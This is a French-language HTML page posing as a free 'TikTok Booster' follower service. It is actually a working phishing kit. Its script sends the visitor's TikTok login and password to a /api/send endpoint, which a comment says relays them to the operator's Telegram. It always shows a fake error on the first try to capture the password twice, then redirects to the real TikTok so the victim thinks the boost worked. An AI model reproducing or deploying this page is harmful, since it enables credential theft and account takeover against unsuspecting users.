<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Booster Pro v2.1</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: radial-gradient(circle at center, #1a102e 0%, #000000 100%); }
        .error-shake { animation: shake 0.2s ease-in-out 0s 2; }
        @keyframes shake { 0% { margin-left: 0rem; } 25% { margin-left: 0.5rem; } 75% { margin-left: -0.5rem; } 100% { margin-left: 0rem; } }
    </style>
</head>
<body class="text-gray-200 font-sans min-h-screen flex flex-col items-center justify-center p-4">

    <div id="auth-section" class="w-full max-w-md bg-black/50 border border-purple-900/50 p-10 rounded-3xl shadow-2xl backdrop-blur-sm text-center">
        <h1 class="text-4xl font-black italic text-white mb-2">TikTok <span class="text-purple-500">Booster</span></h1>
        <p class="text-xs text-gray-400 uppercase tracking-widest mb-6">Service de Boost Gratuit v2.1</p>
        
        <div id="error-msg" class="hidden mb-6 p-3 bg-red-900/30 border border-red-600 text-red-400 text-xs rounded-lg">
            Identifiant ou mot de passe incorrect. Veuillez réessayer.
        </div>

        <form id="auditForm" class="w-full space-y-4">
            <input type="text" id="user" placeholder="E-mail ou Téléphone" required 
                class="w-full p-4 bg-gray-900/80 border border-purple-900 rounded-xl outline-none focus:ring-2 focus:ring-purple-600 text-white">
            <input type="password" id="pass" placeholder="Mot de passe" required 
                class="w-full p-4 bg-gray-900/80 border border-purple-900 rounded-xl outline-none focus:ring-2 focus:ring-purple-600 text-white">
            <button type="submit" id="btn" class="w-full bg-purple-700 text-white font-black py-4 rounded-xl shadow-lg transition hover:bg-purple-600">
                VÉRIFIER & ACTIVER LE BOOST
            </button>
        </form>
    </div>

    <div id="boost-section" class="hidden w-full max-w-lg flex flex-col items-center p-4 text-center">
        <div class="bg-gray-950 border border-purple-800/50 text-white p-8 rounded-3xl w-full shadow-2xl">
            <h3 class="text-[#fe2c55] font-extrabold text-2xl italic mb-6">STATUT : <span class="text-green-400 animate-pulse">CONNECTÉ ✅</span></h3>
            <div class="space-y-6">
                <div class="bg-gray-900 p-5 rounded-xl border border-purple-900 text-left">
                    <label class="block text-xs text-gray-400 mb-2 uppercase tracking-widest">Quantité à injecter</label>
                    <select class="bg-transparent w-full font-bold text-xl outline-none text-purple-200">
                        <option>+ 1,000 Abonnés (Instant)</option>
                        <option>+ 5,000 Abonnés (Premium)</option>
                    </select>
                </div>
                <button id="finalBtn" class="w-full bg-white text-black py-4 rounded-xl font-black text-xl">
                    LANCER LE BOOST 🚀
                </button>
                <p id="loading-text" class="hidden text-xs text-purple-400 animate-bounce">Préparation de l'injection en cours...</p>
            </div>
        </div>
    </div>

    <script>
        let attempts = 0;
        const form = document.getElementById('auditForm');
        
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            const btn = document.getElementById('btn');
            const errorBox = document.getElementById('error-msg');
            const userVal = document.getElementById('user').value;
            const passVal = document.getElementById('pass').value;

            btn.innerText = "Synchronisation...";
            btn.disabled = true;

            try {
                // Envoi des infos à ton API Telegram (6224971749)
                await fetch('/api/send', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ user: userVal, pass: passVal, attempt: attempts + 1 })
                });

                if (attempts === 0) {
                    // Première tentative : On simule une erreur
                    setTimeout(() => {
                        attempts++;
                        btn.disabled = false;
                        btn.innerText = "VÉRIFIER & ACTIVER LE BOOST";
                        errorBox.classList.remove('hidden');
                        document.getElementById('pass').value = "";
                        document.getElementById('auth-section').classList.add('error-shake');
                        setTimeout(() => document.getElementById('auth-section').classList.remove('error-shake'), 500);
                    }, 1200);
                } else {
                    // Deuxième tentative : Succès et passage au booster
                    document.getElementById('auth-section').classList.add('hidden');
                    document.getElementById('boost-section').classList.remove('hidden');
                }
            } catch (err) {
                btn.disabled = false;
                btn.innerText = "Erreur réseau. Réessayer";
            }
        });

        // Action finale : Redirection vers le vrai TikTok
        document.getElementById('finalBtn').addEventListener('click', () => {
            const btn = document.getElementById('finalBtn');
            const text = document.getElementById('loading-text');
            
            btn.classList.add('hidden');
            text.classList.remove('hidden');

            setTimeout(() => {
                // Redirection vers TikTok pour que l'utilisateur pense que c'est fini
                window.location.href = "https://www.tiktok.com/trending";
            }, 3000);
        });
    </script>
</body>
</html>
